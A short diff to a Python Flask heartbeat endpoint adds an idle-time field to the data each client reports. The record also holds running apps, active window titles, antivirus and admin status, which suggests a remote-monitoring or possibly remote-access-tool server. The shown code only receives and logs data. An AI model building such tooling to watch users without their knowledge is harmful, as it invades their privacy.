@@ -38,7 +38,8 @@ def heartbeat():
             "monitors": system_info.get('monitors', []),
             "running_apps": system_info.get('running_apps', []),
             "active_window": system_info.get('active_window', 'N/A'), # Get active window title
-            "active_window_duration": system_info.get('active_window_duration', 0) # Get active window duration
+            "active_window_duration": system_info.get('active_window_duration', 0),
+            "idle_time": system_info.get('idle_time', 0) # Get idle time
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
     return jsonify({"status": "ok"})
